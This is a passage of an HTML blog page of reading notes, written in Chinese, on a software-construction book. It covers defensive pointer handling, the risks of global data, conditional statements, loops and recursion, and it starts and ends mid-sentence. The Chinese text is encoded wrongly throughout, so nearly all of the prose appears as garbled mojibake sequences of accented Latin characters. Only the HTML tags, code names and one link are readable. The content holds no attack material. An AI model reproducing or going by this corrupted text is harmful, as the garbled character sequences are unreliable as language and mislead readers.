ä¹‹åå°½å¿«åœ°æ£€æµ‹å‡ºæŒ‡é’ˆé”™è¯¯æ¥ã€‚æŒ‡é’ˆé”™è¯¯çš„ç—‡çŠ¶é£˜å¿½ä¸å®šï¼Œé‡‡å–ä¸€äº›é¢å¤–æªæ–½æ¥ä½¿å¾—è¿™äº›ç—‡çŠ¶å¯è¢«é¢„æµ‹æ˜¯éå¸¸å€¼å¾—çš„ã€‚</p><ul><li>æŠŠæŒ‡é’ˆæ“ä½œé™åˆ¶åœ¨å­ç¨‹åºæˆ–è€…ç±»é‡Œé¢ã€‚å¦‚ä¸è¦é€šè¿‡æ‰‹åŠ¨æ“ä½œæŒ‡é’ˆå»å®¾åˆ©é“¾è¡¨ï¼Œåº”è¯¥ç¼–å†™ä¸€ç»„è¯¸å¦‚<code>NextLink()</code>ã€<code>PreviousLink()</code>ã€<code>InsertLink()</code>ã€<code>DeleteLink()</code>è¿™æ ·çš„è®¿é—®å™¨å­ç¨‹åºæ¥å®Œæˆæ“ä½œæ›´å¥½äº›ã€‚</li><li>åŒæ—¶å£°æ˜å’Œå®šä¹‰æŒ‡é’ˆã€‚åœ¨é è¿‘å˜é‡å£°æ˜çš„ä½ç½®ä¸ºè¯¥å˜é‡èµ‹åˆå§‹å€¼é€šå¸¸æ˜¯ä¸€é¡¹å¥½çš„ç¼–ç¨‹å®è·µã€‚</li><li>åœ¨ä¸æŒ‡é’ˆåˆ†é…ç›¸åŒçš„ä½œç”¨åŸŸä¸­åˆ é™¤æŒ‡é’ˆ</li><li>åœ¨ä½¿ç”¨æŒ‡é’ˆä¹‹å‰æ£€æŸ¥æŒ‡é’ˆ</li><li>å…ˆæ£€æŸ¥æŒ‡é’ˆæ‰€å¼•ç”¨çš„å˜é‡åœ¨ä½¿ç”¨å®ƒ</li><li>ç”¨ç‹—ç‰Œå­—æ®µæ¥æ£€æµ‹æŸæ¯çš„å†…å­˜ã€‚æ ‡è®°å­—æ®µï¼ˆtag flagï¼‰æˆ–è€…ç‹—ç‰Œï¼ˆdog tagï¼‰æ˜¯æŒ‡ä½ åŠ å…¥ç»“æ„ä½“å†…çš„ä¸€ä¸ªä»…ä»…ç”¨äºæ£€æµ‹é”™è¯¯çš„å­—æ®µã€‚åœ¨åˆ†é…ä¸€ä¸ªå˜é‡çš„æ—¶å€™ï¼ŒæŠŠä¸€ä¸ªåº”è¯¥ä¿æŒä¸å˜çš„æ•°å€¼æ”¾åœ¨å®ƒçš„æ ‡è®°å­—æ®µé‡Œã€‚å½“ä½ ä½¿ç”¨è¯¥ç»“æ„çš„æ—¶å€™â€”â€”ç‰¹åˆ«æ˜¯å½“ä½ é‡Šæ”¾å…¶å†…å­˜çš„æ—¶å€™â€”â€”æ£€æµ‹è¿™ä¸ªæ ‡è®°å­—æ®µçš„å–å€¼ã€‚å¦‚æœè¿™ä¸ªæ ‡è®°å­—æ®µçš„å–å€¼ä¸é¢„æœŸä¸ç¬¦ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°æ®å°±è¢«ç ´åäº†ã€‚åœ¨åˆ é™¤æŒ‡é’ˆçš„æ—¶å€™ï¼Œå°±ç ´åè¿™ä¸ªå­—æ®µã€‚æŠŠç‹—ç‰Œæ”¾ç½®åœ¨ä½ æ‰€åˆ†é…çš„å†…å­˜åŒºåŸŸçš„å¼€å§‹ä½ç½®ï¼Œè®©ä½ èƒ½æ£€æŸ¥æ˜¯å¦å¤šæ‰§è¡Œäº†é‡Šæ”¾è¯¥å†…å­˜çš„æ“ä½œï¼Œè€Œæ— éœ€å»ç»´æŠ¤ä¸€ä¸ªåŒ…å«ä½ æ‰€åˆ†é…çš„å…¨éƒ¨å†…å­˜åŒºåŸŸçš„åˆ—è¡¨ã€‚æŠŠç‹—ç‰Œæ”¾ç½®åœ¨å†…å­˜åŒºåŸŸçš„åé¢ï¼Œè®©ä½ èƒ½æ£€æŸ¥æ˜¯å¦åšè¿‡è¶…å‡ºè¯¥å†…å­˜å—æœ«ä½çš„è¦†ç›–æ•°æ®æ“ä½œã€‚ä½ å¯ä»¥åŒæ—¶åœ¨å‰é¢å’Œåé¢æ”¾ç‹—ç‰Œï¼Œä»¥ä¾¿åŒæ—¶è¾¾åˆ°ä¸Šè¿°ä¸¤ä¸ªç›®çš„ã€‚</li><li>å¢åŠ æ˜æ˜¾çš„å†—ä½™ã€‚å¦ä¸€ç§ä»£æ›¿æ ‡è®°å­—æ®µçš„æ–¹æ¡ˆï¼Œå°±æ˜¯æŸäº›ç‰¹å®šå­—æ®µé‡å¤ä¸¤æ¬¡ã€‚å¦‚æœä½äºå†—ä½™å­—æ®µä¸­çš„æ•°æ®ä¸åŒ¹é…ï¼Œä½ å°±å¯ä»¥ç¡®å®šæ•°æ®å·²ç»è¢«ç ´åäº†ã€‚å¦‚æœä½ ç›´æ¥æ“ä½œæŒ‡é’ˆï¼Œè¿™ä¹ˆåšä¼šå¸¦æ¥å¾ˆé«˜çš„æˆæœ¬ã€‚ç„¶è€Œï¼Œå¦‚æœä½ æŠŠæŒ‡é’ˆæ“ä½œé™åˆ¶åœ¨å­ç¨‹åºé‡Œé¢ï¼Œé‚£ä¹ˆå°±åªéœ€è¦å°‘æ•°å‡ å¤„é‡å¤çš„ä»£ç ã€‚</li><li>ç”¨é¢å¤–çš„æŒ‡é’ˆå˜é‡æ¥æé«˜ä»£ç æ¸…æ™°åº¦ã€‚ä¸€å®šä¸è¦èŠ‚çº¦ä½¿ç”¨æŒ‡é’ˆå˜é‡ï¼Œå³ä¸è¦æŠŠåŒä¸€ä¸ªå˜é‡ç”¨äºå¤šç§ç”¨é€”ã€‚è¿™ä¸€ç‚¹å¯¹æŒ‡é’ˆå˜é‡æ¥è¯´å°¤ä¸ºé‡è¦ã€‚</li><li>ç®€åŒ–å¤æ‚çš„æŒ‡é’ˆè¡¨è¾¾å¼</li><li>ç”»ä¸€ä¸ªå›¾</li><li>æŒ‰ç…§æ­£ç¡®çš„é¡ºåºåˆ é™¤é“¾è¡¨ä¸­çš„æŒ‡é’ˆã€‚åœ¨ä½¿ç”¨åŠ¨æ€åˆ†é…é“¾è¡¨æ—¶ï¼Œç»å¸¸é‡åˆ°çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œå¦‚æœå…ˆé‡Šæ”¾äº†é“¾è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆï¼Œå°±ä¼šå¯¼è‡´ä¸‹ä¸€ä¸ªæŒ‡é’ˆæ— æ³•è®¿é—®ã€‚ä¸ºäº†é¿å…è¿™ä¸€é—®é¢˜ï¼Œåœ¨é‡Šæ”¾å½“å‰æŒ‡é’ˆå‰ï¼Œè¦ç¡®ä¿å·²ç»æœ‰æŒ‡å‘é“¾è¡¨ä¸­ä¸‹ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚</li><li>åˆ†é…ä¸€ç‰‡ä¿ç•™çš„å†…å­˜åå¤‡åŒºåŸŸã€‚å¦‚æœåœ¨ä½ çš„ç¨‹åºä¸­ä½¿ç”¨äº†åŠ¨æ€å†…å­˜ï¼Œå°±éœ€è¦é¿å…å‘ç”Ÿç¨‹åºå†…å­˜å¿½ç„¶è¢«è€—å°½ã€ç”¨æˆ·å’Œæ•°æ®è¢«ä¸¢åœ¨ RAM é‡Œçš„å°´å°¬åœºæ™¯ã€‚</li><li>ç²‰ç¢åƒåœ¾æ•°æ®</li><li>åœ¨åˆ é™¤æˆ–è€…é‡Šæ”¾æŒ‡é’ˆä¹‹åæŠŠå®ƒä»¬è®¾ç½®ä¸ºç©ºå€¼</li><li>åœ¨åˆ é™¤å˜é‡ä¹‹å‰æ£€æŸ¥éæ³•æŒ‡é’ˆ</li><li>è·Ÿè¸ªæŒ‡é’ˆåˆ†é…æƒ…å†µ</li><li>ç¼–å†™è¦†ç›–å­ç¨‹åºï¼Œé›†ä¸­å®ç°é¿å…æŒ‡é’ˆé—®é¢˜çš„ç­–ç•¥</li><li>é‡‡ç”¨éæŒ‡é’ˆæŠ€æœ¯</li></ul><h3 id="å…¨å±€æ•°æ®"><a href="#å…¨å±€æ•°æ®" class="headerlink" title="å…¨å±€æ•°æ®"></a>å…¨å±€æ•°æ®</h3><p><strong>ä½¿ç”¨å…¨å±€æ•°æ®çš„é£é™©æ¯”ä½¿ç”¨å±€éƒ¨æ•°æ®å¤§ã€‚</strong></p><p>ä½¿ç”¨å…¨å±€æ•°æ®çš„ä¸€äº›é—®é¢˜ï¼š</p><ul><li>æ— æ„é—´ä¿®æ”¹äº†å…¨å±€æ•°æ®</li><li>åœ¨å¤šä¸ªçº¿ç¨‹è¿è¡Œæ—¶å…¨å±€æ•°æ®ä¿è¯ä¸ä¼šè¢«ä¿®æ”¹</li><li>é˜»ç¢ä»£ç å¤ç”¨ã€‚å°†Aç¨‹åºä»£ç ç§»æ¤åˆ°Bä»£ç éœ€è¦ä¸€å¹¶ç§»æ¤Açš„å…¨å±€æ•°æ®ã€‚</li><li>å…¨å±€æ•°æ®ç ´åäº†æ¨¡å—åŒ–å’Œæ™ºåŠ›ä¸Šçš„å¯ç®¡ç†æ€§ã€‚åˆ›å»ºè¶…è¿‡å‡ ç™¾è¡Œä»£ç çš„ç¨‹åºçš„æ ¸å¿ƒä¾¿æ˜¯ç®¡ç†å¤æ‚åº¦ã€‚ä½ èƒ½å¤Ÿåœ¨æ™ºåŠ›ä¸Šç®¡ç†ä¸€ä¸ªå¤§å‹ç¨‹åºçš„å”¯ä¸€æ–¹æ³•å°±æ˜¯æŠŠå®ƒæ‹†åˆ†æˆå‡ éƒ¨åˆ†ï¼Œä»è€Œå¯ä»¥åªåœ¨åŒä¸€æ—¶é—´åªè€ƒè™‘ä¸€éƒ¨åˆ†ã€‚æ¨¡å—åŒ–å°±æ˜¯ä½ æ‰‹ä¸­å¯ä»¥ä½¿ç”¨çš„æœ€å¼ºå¤§çš„å·¥å…·ã€‚å…¨å±€æ•°æ®ä½¿å¾—ä½ çš„æ¨¡å—åŒ–å¤§æ‰“æŠ˜æ‰£ã€‚å¦‚æœä½ ä½¿ç”¨äº†å…¨å±€æ•°æ®ï¼Œä½ ä¸å¾—ä¸å…³æ³¨ä¸€ä¸ªå­ç¨‹åºï¼Œä»¥åŠä½¿ç”¨äº†åŒæ ·å…¨å±€æ•°æ®çš„å…¶ä»–æ‰€æœ‰å­ç¨‹åºã€‚å°½ç®¡å…¨å±€æ•°æ®å¹¶æ²¡æœ‰å®Œå…¨ç ´åæ¨¡å—åŒ–ï¼Œä½†å´å‰Šå¼±äº†å®ƒã€‚</li></ul><p><strong>åªæœ‰ä¸‡ä¸å¾—å·²çš„æ—¶å€™æ‰ä½¿ç”¨å…¨å±€æ•°æ®ã€‚</strong></p><p>å½“ä½¿ç”¨å…¨å±€æ•°æ®æ—¶ï¼Œä¸€ä¸ªå¥½çš„ä¹ æƒ¯æ˜¯ï¼Œå°†æ‰€æœ‰å…¨å±€æ•°æ®éƒ½å† ä»¥<code>_g</code>å‰ç¼€ï¼Œå¹¶ä¸”ç”¨è®¿é—®å™¨å­ç¨‹åºæ¥ç®¡ç†å…¨å±€æ•°æ®ï¼Œé™¤äº†è¯¥å˜é‡çš„è®¿é—®å™¨å­ç¨‹åºä»¥å¤–ï¼Œæ‰€æœ‰çš„ä»£ç éƒ½ä¸å¯ä»¥è®¿é—®<code>_g</code>å‰ç¼€çš„å˜é‡ã€‚å…¶ä»–ä»£ç å‡é€šè¿‡è®¿é—®å™¨å­ç¨‹åºæ¥å­˜å–è¯¥æ•°æ®ã€‚å¦å¤–ï¼Œå…¨å±€æ•°æ®å†è®¾ç½®æ—¶ï¼Œå…ˆå°†æ¯ä¸ªå˜é‡è®¾ç½®ä¸ºå±€éƒ¨å˜é‡ï¼Œä»…å½“å¿…é¡»æ—¶å†ä¿®æ”¹ä¸ºå…¨å±€ã€‚çŠ¹å¦‚ç±»ä¸­å…ˆè®¾ä¸º<code>private</code>ï¼Œå†è®¾ä¸º<code>public</code>ã€‚</p><p>ä¸è¦æŠŠæ‰€æœ‰çš„å…¨å±€æ•°æ®æ‰”åœ¨ä¸€èµ·ã€‚å¦‚æœæŠŠæ‰€æœ‰çš„å…¨å±€æ•°æ®éƒ½å †åœ¨ä¸€èµ·ï¼Œç„¶åä¸ºå®ƒç¼–å†™ä¸€äº›è®¿é—®å™¨å­ç¨‹åºï¼Œä½ å¯ä»¥æ¶ˆç­æ‰€æœ‰ä¸å…¨å±€æ•°æ®æœ‰å…³çš„é—®é¢˜ï¼Œä½†è¿™ä¹Ÿä½¿ä»£ç ä¸§å¤±äº†ä¿¡æ¯éšè—å’ŒæŠ½è±¡æ•°æ®ç±»å‹æ‰€å¸¦æ¥çš„å¥½å¤„ã€‚æ—¢ç„¶å·²ç»åœ¨ç¼–å†™è®¿é—®å™¨å­ç¨‹åºï¼Œå°±è¯·èŠ±ä¸€äº›æ—¶é—´è€ƒè™‘æ¯ä¸€ä¸ªå…¨å±€æ•°æ®æ‰€å±çš„ç±»ï¼Œç„¶åæŠŠè¯¥æ•°æ®å’Œå®ƒè®¿é—®å™¨å­ç¨‹åºä»¥åŠå…¶ä»–æ•°æ®å’Œå­ç¨‹åºæ‰“åŒ…æ”¾å…¥é‚£ä¸ªç±»ã€‚</p><p>å¦‚ä½•è§£å†³å…¨å±€æ•°æ®å†å¤šçº¿ç¨‹è¿è¡Œæ—¶ä¸ä¼šè¢«æ„å¤–ä¿®æ”¹å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡é”æ¥æ§åˆ¶å¯¹å…¨å±€å˜é‡çš„è®¿é—®ã€‚</p><p><strong>åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œå…¨å±€æ•°æ®äº‹å®ä¸Šå°±æ˜¯æ²¡æœ‰è®¾è®¡å¥½æˆ–è€…æ²¡æœ‰å®ç°å¥½çš„ç±»ä¸­çš„æ•°æ®ã€‚åœ¨å°‘æ•°æƒ…å†µä¸‹ï¼Œä¸€äº›æ•°æ®çš„ç¡®éœ€è¦ä½œä¸ºå…¨å±€æ•°æ®ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨è®¿é—®å™¨å­ç¨‹åºå¯¹å…¶è¿›è¡Œå°è£…ï¼Œä»è€Œæœ€å¤§é™åº¦å‡å°‘å‘ç”Ÿé—®é¢˜çš„å‡ ç‡ã€‚åœ¨å‰©ä½™çš„æå°‘æ•°æƒ…å†µä¸‹ï¼Œä½ çœŸçš„éœ€è¦ä½¿ç”¨å…¨å±€æ•°æ®ã€‚</strong></p><h2 id="ç¬¬14ç« -ç»„ç»‡ç›´çº¿å‹ä»£ç "><a href="#ç¬¬14ç« -ç»„ç»‡ç›´çº¿å‹ä»£ç " class="headerlink" title="ç¬¬14ç«  ç»„ç»‡ç›´çº¿å‹ä»£ç "></a>ç¬¬14ç«  ç»„ç»‡ç›´çº¿å‹ä»£ç </h2><p><strong>è¦è®©ç¨‹åºæ˜“äºè‡ªä¸Šè€Œä¸‹é˜…è¯»ï¼Œè€Œä¸æ˜¯è®©è¯»è€…ç›®å…‰è·³æ¥è·³å»ã€‚</strong>å¦‚æœæœ‰äººåœ¨é˜…è¯»ä½ ä»£ç æ—¶ä¸å¾—ä¸æœç´¢æ•´ä¸ªç¨‹åºæ¥æ‰¾åˆ°æ‰€éœ€ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±åº”è¯¥é‡æ–°ç»„ç»‡ä¸‹ä½ çš„ä»£ç äº†ã€‚</p><p>ç›´çº¿å‹ä»£ç è¦æŠŠç›¸å…³çš„è¯­å¥ç»„ç»‡åˆ°ä¸€èµ·ï¼Œå¥½çš„ç›¸å…³ä»£ç ç»“æ„åº”è¯¥åƒå·¦ä¾§ä¸€æ ·ï¼Œæ–¹å—é—´ä¸ä¼šæœ‰é‡å ã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872vdz390j30mi0bc0u7.jpg" alt=""></p><h2 id="ç¬¬15ç« -ä½¿ç”¨æ¡ä»¶è¯­å¥"><a href="#ç¬¬15ç« -ä½¿ç”¨æ¡ä»¶è¯­å¥" class="headerlink" title="ç¬¬15ç«  ä½¿ç”¨æ¡ä»¶è¯­å¥"></a>ç¬¬15ç«  ä½¿ç”¨æ¡ä»¶è¯­å¥</h2><h3 id="ä½¿ç”¨-if-è¯­å¥æ—¶ï¼Œè¯·éµå¾ªä¸‹è¿°æŒ‡å¯¼åŸåˆ™"><a href="#ä½¿ç”¨-if-è¯­å¥æ—¶ï¼Œè¯·éµå¾ªä¸‹è¿°æŒ‡å¯¼åŸåˆ™" class="headerlink" title="ä½¿ç”¨ if è¯­å¥æ—¶ï¼Œè¯·éµå¾ªä¸‹è¿°æŒ‡å¯¼åŸåˆ™"></a>ä½¿ç”¨ if è¯­å¥æ—¶ï¼Œè¯·éµå¾ªä¸‹è¿°æŒ‡å¯¼åŸåˆ™</h3><ul><li>é¦–å…ˆå†™æ­£å¸¸ä»£ç é€»è¾‘ï¼Œå†å¤„ç†ä¸å¸¸è§æƒ…å†µ</li><li>ç¡®ä¿å¯¹äºç­‰é‡åˆ¤æ–­æ­£ç¡®ã€‚è¯·ä¸è¦ç”¨<code>&gt;</code>ä»£æ›¿<code>&gt;=</code>æˆ–ç”¨<code>&lt;</code>ä»£æ›¿<code>&lt;=</code>ï¼Œåœ¨å¾ªç¯ä¸­ï¼Œè¦ä»”ç»†è€ƒè™‘é¿å…çŠ¯åå·® 1 çš„é”™è¯¯</li><li>æŠŠæ­£å¸¸æƒ…å†µçš„å¤„ç†æ”¾åœ¨ if é‡Œè€Œä¸æ˜¯åœ¨ else ä¸­</li><li>è®© if ä¸­è·Ÿä¸€ä¸ªæœ‰æ„ä¹‰çš„è¯­å¥</li><li>è€ƒè™‘æ˜¯å¦çœŸçš„éœ€è¦ else è¯­å¥</li><li>æ£€æŸ¥ if ä¸ else æ˜¯å¦å¼„åäº†</li></ul><h3 id="ä½¿ç”¨-if-else-æ—¶è¯·æ³¨æ„"><a href="#ä½¿ç”¨-if-else-æ—¶è¯·æ³¨æ„" class="headerlink" title="ä½¿ç”¨ if-else æ—¶è¯·æ³¨æ„"></a>ä½¿ç”¨ if-else æ—¶è¯·æ³¨æ„</h3><ul><li>åˆ©ç”¨å¸ƒå°”å‡½æ•°è°ƒç”¨ç®€åŒ–å¤æ‚çš„æ£€æµ‹</li><li>æŠŠæœ€å¸¸è§çš„æƒ…å†µæ”¾åœ¨æœ€å‰é¢ã€‚æ˜“äºé˜…è¯»ï¼Œæ‰§è¡Œæ•ˆç‡é«˜ã€‚</li><li>ç¡®ä¿æ‰€æœ‰çš„æƒ…å†µéƒ½è€ƒè™‘åˆ°äº†</li><li>å¤æ‚çš„ if-else è¯·ä½¿ç”¨ case æ›¿ä»£</li></ul><h3 id="ä½¿ç”¨-case-è¯­å¥æ—¶æ’åºçš„çªé—¨"><a href="#ä½¿ç”¨-case-è¯­å¥æ—¶æ’åºçš„çªé—¨" class="headerlink" title="ä½¿ç”¨ case è¯­å¥æ—¶æ’åºçš„çªé—¨"></a>ä½¿ç”¨ case è¯­å¥æ—¶æ’åºçš„çªé—¨</h3><ul><li><strong>æŒ‰ç…§å­—æ¯é¡ºåºæˆ–è€…æ•°å­—é¡ºåºæ’åˆ—å„ç§æƒ…å†µ</strong>ã€‚å¦‚æœæ‰€æœ‰æƒ…å†µçš„é‡è¦æ€§éƒ½ç›¸åŒï¼Œé‚£ä¹ˆå°±æŠŠä»–ä»¬æŒ‰å­—æ¯é¡ºåºæ’åˆ—ï¼Œä»¥ä¾¿æé«˜å¯è¯»æ€§ã€‚</li><li><strong>æŠŠæ­£å¸¸çš„æƒ…å†µæ”¾åœ¨å‰é¢</strong>ã€‚å¦‚æœæœ‰ä¸€ä¸ªæ­£å¸¸çš„æƒ…å†µå’Œå¤šä¸ªå¼‚å¸¸æƒ…å†µï¼Œé‚£ä¹ˆå°±æŠŠé‚£ä¸ªæ­£å¸¸çš„æƒ…å†µæ”¾åœ¨æœ€å‰é¢ã€‚ç”¨æ³¨é‡Šæ¥è¯´æ˜å®ƒæ˜¯æ­£å¸¸æƒ…å†µï¼Œè€Œå…¶ä»–çš„å±äºéæ­£å¸¸æƒ…å†µã€‚</li><li><strong>æŒ‰æ‰§è¡Œé¢‘ç‡æ’åˆ—caseå­å¥</strong>ã€‚æŠŠæœ€ç»å¸¸æ‰§è¡Œçš„æƒ…å†µæ”¾åœ¨æœ€å‰é¢ï¼Œæœ€ä¸å¸¸æ‰§è¡Œçš„æ”¾åœ¨æœ€åã€‚</li></ul><h3 id="ä½¿ç”¨-case-è¯­å¥çš„è¯€çª"><a href="#ä½¿ç”¨-case-è¯­å¥çš„è¯€çª" class="headerlink" title="ä½¿ç”¨ case è¯­å¥çš„è¯€çª"></a>ä½¿ç”¨ case è¯­å¥çš„è¯€çª</h3><ul><li>ç®€åŒ–æ¯ç§æƒ…å†µå¯¹åº”çš„æ“ä½œã€‚å¦‚æœæŸç§æƒ…å†µçš„æ“ä½œéå¸¸å¤æ‚ï¼Œå°±å†™ä¸€ä¸ªå­ç¨‹åºï¼Œå¹¶åœ¨è¯¥æƒ…å†µå¯¹åº”çš„ case å­—å¥ä¸­è°ƒç”¨å®ƒï¼Œè€Œä¸è¦æŠŠä»£ç æœ¬èº«æ”¾è¿›è¿™ä¸€ case å­å¥ä¸­ã€‚</li><li>ä¸è¦ä¸ºäº†ä½¿ç”¨ case è¯­å¥è€Œåˆ»æ„åˆ¶é€ ä¸€ä¸ªå˜é‡ã€‚caseè¯­å¥åº”è¯¥ç”¨äºå¤„ç†ç®€å•çš„ã€å®¹æ˜“åˆ†ç±»çš„æ•°æ®ã€‚å¦‚æœä½ çš„æ•°æ®å¹¶ä¸ç®€å•ï¼Œé‚£ä¹ˆå°±ä½¿ç”¨ if-then-else è¯­å¥ä¸²ã€‚ä¸ºä½¿ç”¨caseè€Œåˆ»æ„æ„é€ å‡ºçš„å˜é‡å¾ˆå®¹æ˜“æŠŠäººæç³Šæ¶‚ï¼Œä½ åº”è¯¥é¿å…ä½¿ç”¨è¿™ç§å˜é‡ã€‚.</li><li><strong>æŠŠ default ç”¨äºæ£€æŸ¥çœŸæ­£çš„é»˜è®¤æƒ…å†µï¼Œè€Œä¸è¦ç”¨äºæœ€åéœ€è¦å¤„ç†çš„æƒ…å†µ</strong>ï¼Œè¿™ä¼šè®©äººå¾ˆè¿·æƒ‘å¹¶éš¾ä»¥ç»´æŠ¤ã€‚</li><li>åˆ©ç”¨ default æ£€æŸ¥é”™è¯¯</li></ul><h2 id="ç¬¬16ç« -æ§åˆ¶å¾ªç¯"><a href="#ç¬¬16ç« -æ§åˆ¶å¾ªç¯" class="headerlink" title="ç¬¬16ç«  æ§åˆ¶å¾ªç¯"></a>ç¬¬16ç«  æ§åˆ¶å¾ªç¯</h2><p>åœ¨ä»£ç è¿›å…¥å¾ªç¯æ—¶ä½¿ç”¨ä¸‹è¿°æŒ‡å¯¼åŸåˆ™ï¼š</p><ul><li>åªä»ä¸€ä¸ªä½ç½®è¿›å…¥å¾ªç¯</li><li>æŠŠåˆå§‹åŒ–ä»£ç ç´§æ”¾åœ¨å¾ªç¯å‰é¢</li><li>ç”¨ <code>while(true)</code>è¡¨ç¤ºæ— é™å¾ªç¯ï¼Œè€Œé<code>for i = 1 to 999999</code></li><li>åœ¨é€‚å½“çš„æƒ…å†µä¸‹å¤šä½¿ç”¨forå¾ªç¯ã€‚for å¾ªç¯å°†æ§åˆ¶ä»£ç éƒ½é›†ä¸­åœ¨ä¸€å¤„ï¼Œä»è€Œæœ‰åŠ©äºå†™å‡ºå¯è¯»æ€§å¼ºçš„å¾ªç¯ã€‚ä¿®æ”¹ while å¾ªç¯æ—¶ï¼Œå¸¸å¸¸å®¹æ˜“åªä¿®æ”¹äº†å¤´éƒ¨çš„åˆå§‹åŒ–ä»£ç ï¼Œè€Œå¿˜è®°ä¿®æ”¹é€€å‡ºä»£ç ï¼Œè€Œ for å¾ªç¯çš„åˆå§‹åŒ–ä¸é€€å‡ºåˆ™éƒ½åœ¨ä¸€èµ·</li><li>åœ¨ while æ›´é€‚ç”¨æ—¶ï¼Œä¸è¦ä½¿ç”¨ for å¾ªç¯</li></ul><p>é«˜æ•ˆç¨‹åºå‘˜ä¸ä½æ•ˆç¨‹åºå‘˜çš„å·®åˆ«åœ¨äºï¼šé«˜æ•ˆç¨‹åºå‘˜ä¼šåœ¨è„‘æµ·ä¸­æ¨¡æ‹Ÿç¨‹åºçš„æ‰§è¡Œï¼Œå¹¶ä¼šæ‰‹åŠ¨è®¡ç®—æ¥å‡å°‘å·®é”™ã€‚è€Œä½æ•ˆç¨‹åºå‘˜åˆ™åœ¨ä¸åœçš„è¯•éªŒï¼Œå¯»æ‰¾ä¸€ç§çœ‹ä¸Šå»èƒ½å·¥ä½œçš„ç»„åˆï¼Œè¿™æ ·åšæœ€ç»ˆå¯èƒ½ä¼šç¢°å‡ºæ­£ç¡®çš„ç»„åˆæ¥ï¼Œä¹Ÿå¯èƒ½æŠŠåŸæœ‰çš„é”™è¯¯æ”¹æˆäº†å¦ä¸€ä¸ªæ›´å¾®å¦™çš„é”™è¯¯ã€‚å³ä½¿è¿™æ ·éšæ„çš„å¼€å‘è¿‡ç¨‹èƒ½å¤Ÿäº§ç”Ÿå‡ºä¸€ä¸ªæ­£ç¡®çš„ç¨‹åºï¼Œè¿™äº›ç¨‹åºå‘˜ä¹Ÿä¸æ˜ç™½ä¸ºä»€ä¹ˆè¿™ä¸ªç¨‹åºæ˜¯æ­£ç¡®çš„ã€‚<strong>ä½ éœ€è¦çœŸæ­£ç†è§£ä½ çš„ä»£ç æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œè€Œä¸æ˜¯ççŒœã€‚</strong></p><p>å¾ªç¯ä¸‹æ ‡å°½é‡ä½¿å…¶å…·æœ‰å¯è¯»æ€§ï¼Œé¿å…ä½¿ç”¨<code>i</code>ã€<code>j</code>ã€<code>k</code>ï¼Œä»¥åŠåœ¨åµŒå¥—å¾ªç¯ä¸­é‡å¤ä½¿ç”¨ç›¸åŒçš„ä¸‹æ ‡åã€‚</p><h3 id="å¾ªç¯åº”è¯¥æœ‰å¤šé•¿ï¼Ÿ"><a href="#å¾ªç¯åº”è¯¥æœ‰å¤šé•¿ï¼Ÿ" class="headerlink" title="å¾ªç¯åº”è¯¥æœ‰å¤šé•¿ï¼Ÿ"></a>å¾ªç¯åº”è¯¥æœ‰å¤šé•¿ï¼Ÿ</h3><ul><li>å¾ªç¯è¦å°½å¯èƒ½çš„çŸ­ï¼Œä»¥ä¾¿èƒ½å¤Ÿä¸€ç›®äº†ç„¶</li><li>æŠŠåµŒå¥—é™åˆ¶åœ¨ 3 å±‚ä»¥å†…</li><li>æŠŠé•¿å¾ªç¯çš„å†…å®¹ç§»åˆ°å­ç¨‹åºé‡Œ</li><li>è¦è®©é•¿å¾ªç¯æ ¼å¤–æ¸…æ™°</li></ul><h2 id="ç¬¬17ç« -ä¸å¸¸è§çš„æ§åˆ¶ç»“æ„"><a href="#ç¬¬17ç« -ä¸å¸¸è§çš„æ§åˆ¶ç»“æ„" class="headerlink" title="ç¬¬17ç«  ä¸å¸¸è§çš„æ§åˆ¶ç»“æ„"></a>ç¬¬17ç«  ä¸å¸¸è§çš„æ§åˆ¶ç»“æ„</h2><p>ä½¿ç”¨é€’å½’çš„æŠ€å·§ï¼š</p><ul><li>ç¡®è®¤é€’å½’èƒ½å¤Ÿåœæ­¢</li><li>ä½¿ç”¨å®‰å…¨è®¡æ•°å™¨æ”¾ç½®å‡ºç°æ— ç©·é€’å½’</li><li>æŠŠé€’å½’é™åˆ¶åœ¨ä¸€ä¸ªå­ç¨‹åºå†…</li><li>ç•™å¿ƒæ ˆç©ºé—´</li><li>ä¸è¦ç”¨é€’å½’å»è®¡ç®—é˜¶ä¹˜æˆ–è€…æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼ˆ<a href="https://blog.csdn.net/code_see/article/details/6327472" target="_blank" rel="noopener">ä¸ºä»€ä¹ˆç”¨ é€’å½’ è®¡ç®—â€œé˜¶ä¹˜â€å’Œâ€œæ–æ³¢é‚£å¥‘æ•°åˆ—â€æ˜¯ä¸åˆé€‚çš„ï¼Ÿ</a>ï¼‰</li></ul><h2 id="ç¬¬18ç« -è¡¨é©±åŠ¨æ³•"><a href="#ç¬¬18ç« -è¡¨é©±åŠ¨æ³•" class="headerlink" title="ç¬¬18ç«  è¡¨é©±åŠ¨æ³•"></a>ç¬¬18ç«  è¡¨é©±åŠ¨æ³•</h2><p>ï¼ˆç•¥ï¼‰</p><h2 id="ç¬¬19ç« -ä¸€èˆ¬æ§åˆ¶é—®é¢˜"><a href="#ç¬¬19ç« -ä¸€èˆ¬æ§åˆ¶é—®é¢˜" class="headerlink" title="ç¬¬19ç«  ä¸€èˆ¬æ§åˆ¶é—®é¢˜"></a>ç¬¬19ç«  ä¸€èˆ¬æ§åˆ¶é—®é¢˜</h2><p>å¦‚ä½•ç®€åŒ–å¤æ‚çš„è¡¨è¾¾å¼ï¼Ÿ</p><ul><li>ç¼–å†™è‚¯å®šçš„å¸ƒå°”è¡¨è¾¾å¼ï¼Œå°½å¯èƒ½å‡å°‘è¯¸å¦‚<code>if(!status)</code>è¿™æ ·çš„å¦å®šåˆ¤æ–­</li><li>ç”¨æ‹¬å·ä½¿å¸ƒå°”è¡¨è¾¾å¼æ›´æ¸…æ™°</li></ul><p>ç¼–ç¨‹ä¸­ï¼Œ0 